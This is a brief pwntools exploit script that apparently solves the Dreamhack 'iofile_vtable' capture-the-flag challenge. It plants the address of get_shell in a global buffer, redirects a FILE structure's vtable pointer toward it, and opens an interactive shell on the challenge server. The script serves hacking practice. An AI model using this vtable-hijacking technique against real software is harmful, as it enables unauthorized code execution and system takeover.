from pwn import *

port = 21917
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Pwnable/iofile_vtable/problem/iofile_vtable")

shell_addr = elf.symbols['get_shell']
name_addr = elf.symbols['name']

rem.sendlineafter(b'name: ', p64(shell_addr))

rem.sendlineafter(b'> ', b'4')
rem.send(p64(name_addr - 0x38))

rem.sendlineafter(b'>', b'2')

rem.interactive()